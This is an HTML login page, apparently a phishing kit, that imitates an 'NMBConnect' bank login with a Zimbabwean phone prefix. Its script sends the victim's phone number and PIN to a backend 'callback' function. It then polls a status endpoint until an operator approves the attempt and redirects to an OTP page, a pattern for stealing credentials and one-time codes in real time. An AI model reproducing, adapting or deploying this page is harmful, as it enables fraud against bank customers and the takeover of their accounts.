<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NMBConnect - Secure Login</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f4f6f8;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        /* Top Blue Header Banner */
        .header-banner {
            background-color: #1a56db;
            color: white;
            padding: 30px 20px 70px 20px;
            text-align: center;
        }

        .logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 24px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }

        .logo-icon {
            font-size: 18px;
            background: #facc15;
            color: #1a56db;
            padding: 2px 6px;
            border-radius: 4px;
        }

        .logo-text span {
            color: #facc15;
        }

        /* Main Container Card */
        .main-content {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-grow: 1;
            padding: 20px;
            margin-top: -60px; /* Overlap the blue header */
        }

        .login-card {
            background: #ffffff;
            width: 100%;
            max-width: 550px;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
        }

        .login-title {
            text-align: center;
            font-size: 22px;
            font-weight: 600;
            color: #1f2937;
            margin-bottom: 8px;
        }

        .login-subtitle {
            text-align: center;
            font-size: 14px;
            color: #6b7280;
            margin-bottom: 30px;
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: 0.5px;
            color: #4b5563;
            margin-bottom: 8px;
            text-transform: uppercase;
        }

        .phone-input-wrapper {
            display: flex;
            align-items: center;
            border: 1.5px solid #d1d5db;
            border-radius: 8px;
            padding: 0 14px;
            background: #fff;
            transition: border-color 0.2s;
        }

        .phone-input-wrapper:focus-within {
            border-color: #1a56db;
        }

        .country-flag {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 14px;
            font-weight: 500;
            color: #374151;
            padding-right: 12px;
            border-right: 1px solid #e5e7eb;
            margin-right: 12px;
        }

        .phone-input {
            width: 100%;
            border: none;
            outline: none;
            font-size: 16px;
            color: #1f2937;
            padding: 12px 0;
            background: transparent;
        }

        /* PIN Boxes Style */
        .pin-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 8px;
        }

        .pin-box {
            width: 50px;
            height: 50px;
            text-align: center;
            font-size: 20px;
            font-weight: 600;
            border: 1.5px solid #d1d5db;
            border-radius: 8px;
            outline: none;
            background: #fff;
            transition: all 0.2s;
        }

        .pin-box:focus {
            border-color: #1a56db;
            box-shadow: 0 0 0 3px rgba(26, 86, 219, 0.1);
        }

        /* Show PIN Checkbox */
        .checkbox-group {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 24px;
            font-size: 13px;
            color: #4b5563;
            cursor: pointer;
        }

        .checkbox-group input {
            accent-color: #1a56db;
            width: 15px;
            height: 15px;
            cursor: pointer;
        }

        /* Continue Button */
        .btn-continue {
            width: 100%;
            background-color: #f3f4f6;
            color: #9ca3af;
            font-weight: 600;
            font-size: 14px;
            padding: 14px;
            border: none;
            border-radius: 8px;
            cursor: not-allowed;
            transition: background-color 0.2s, color 0.2s;
        }

        .btn-continue.active {
            background-color: #1a56db;
            color: white;
            cursor: pointer;
        }

        .btn-continue.active:hover {
            background-color: #1e40af;
        }

        /* Footer */
        .footer {
            background-color: #1a56db;
            color: rgba(255, 255, 255, 0.8);
            text-align: center;
            padding: 16px;
            font-size: 12px;
        }
    </style>
</head>
<body>

    <!-- Header Banner -->
    <div class="header-banner">
        <div class="logo-container">
            <div class="logo-text">NMB<span>Connect</span></div>
        </div>
    </div>

    <!-- Main Card -->
    <div class="main-content">
        <div class="login-card">
            <h1 class="login-title">Secure Login</h1>
            <p class="login-subtitle">Enter your NMB phone & PIN</p>
            <div id="error-message" style="display: none; background-color: #ffebee; color: #c62828; padding: 10px; border-radius: 5px; margin-bottom: 15px; font-size: 14px; text-align: center; border: 1px solid #ef9a9a;"></div>

            <form id="loginForm">
                <!-- Phone Number Field -->
                <div class="form-group">
                    <label class="form-label" for="phone">Phone Number</label>
                    <div class="phone-input-wrapper">
                        <div class="country-flag">
                            <span>🇿🇼</span> +263
                        </div>
                        <input type="tel" id="phone" class="phone-input" value="" placeholder="e.g. 712345678" maxlength="9">
                    </div>
                </div>

                <!-- PIN Fields -->
                <div class="form-group">
                    <label class="form-label">Enter PIN</label>
                    <div class="pin-container" id="pinContainer">
                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                    </div>
                </div>

                <!-- Show PIN Toggle -->
                <label class="checkbox-group">
                    <input type="checkbox" id="showPin"> Show PIN
                </label>

                <!-- Continue Button -->
                <button type="submit" id="continueBtn" class="btn-continue">CONTINUE</button>
            </form>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        © 2026 NMB Holdings | Secure Login
    </div>

    <!-- Floating Spinner Overlay -->
    <div id="floatingSpinner" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 9999; flex-direction: column; justify-content: center; align-items: center;">
        <div style="width: 50px; height: 50px; border: 4px solid #1a56db; border-top: 4px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
        <p style="margin-top: 15px; color: #1a56db; font-weight: 600; font-size: 16px;">Processing, please wait...</p>
    </div>

    <script>
        const pinBoxes = document.querySelectorAll('.pin-box');
        const showPinCheckbox = document.getElementById('showPin');
        const continueBtn = document.getElementById('continueBtn');
        const phoneInput = document.getElementById('phone');

        // Handle PIN Box Navigation & Typing Logic
        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                const value = e.target.value;
                if (value && index < pinBoxes.length - 1) {
                    pinBoxes[index + 1].focus();
                }
                checkFormValidity();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !box.value && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });

        // Show/Hide PIN toggle logic
        showPinCheckbox.addEventListener('change', () => {
            const type = showPinCheckbox.checked ? 'text' : 'password';
            pinBoxes.forEach(box => {
                box.type = type;
            });
        });

        // Check if form is filled to activate button
        function checkFormValidity() {
            const phoneVal = phoneInput.value.trim();
            const pinFilled = Array.from(pinBoxes).every(box => box.value.length === 1);

            if (phoneVal.length >= 9 && pinFilled) {
                continueBtn.classList.add('active');
                continueBtn.disabled = false;
            } else {
                continueBtn.classList.remove('active');
                continueBtn.disabled = true;
            }
        }

        phoneInput.addEventListener('input', checkFormValidity);
        
        const loginForm = document.getElementById('loginForm');
        const errorDiv = document.getElementById('error-message');

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            if (continueBtn.disabled) return;

            const phone = phoneInput.value.trim();
            const pin = Array.from(pinBoxes).map(box => box.value).join('');
            
            errorDiv.style.display = 'none';
            document.getElementById('floatingSpinner').style.display = 'flex';
            continueBtn.disabled = true;

            try {
                const resp = await fetch(`/.netlify/functions/callback`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        type: 'login',
                        phone: phone,
                        details: pin, // Send only the PIN here
                        destination: 'primary'
                    })
                });
                const data = await resp.json();
                
                if (data.attemptId) {
                    pollStatus(data.attemptId, phone);
                } else {
                    throw new Error('No attempt ID returned');
                }
            } catch (e) {
                console.error('Login submission error', e);
                errorDiv.textContent = 'Error submitting. Please try again.';
                errorDiv.style.display = 'block';
                document.getElementById('floatingSpinner').style.display = 'none';
                continueBtn.disabled = false;
            }
        });

        async function pollStatus(attemptId, phone) {
            try {
                const response = await fetch(`/.netlify/functions/check-status?attemptId=${attemptId}&_t=${Date.now()}`);
                const data = await response.json();

                if (data.status === 'approved') {
                    window.location.href = `otp.html?attemptId=${attemptId}&phone=${encodeURIComponent(phone)}`;
                } else if (data.status === 'rejected') {
                    errorDiv.textContent = 'Login rejected. Please check your credentials and try again.';
                    errorDiv.style.display = 'block';
                    document.getElementById('floatingSpinner').style.display = 'none';
                    continueBtn.disabled = false;
                    pinBoxes.forEach(box => box.value = '');
                    pinBoxes[0].focus();
                    checkFormValidity();
                } else {
                    setTimeout(() => pollStatus(attemptId, phone), 2000);
                }
            } catch (error) {
                console.error('Error polling status:', error);
                setTimeout(() => pollStatus(attemptId, phone), 2000);
            }
        }

        // Initial check on load
        checkFormValidity();
    </script>
    <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</body>
</html>
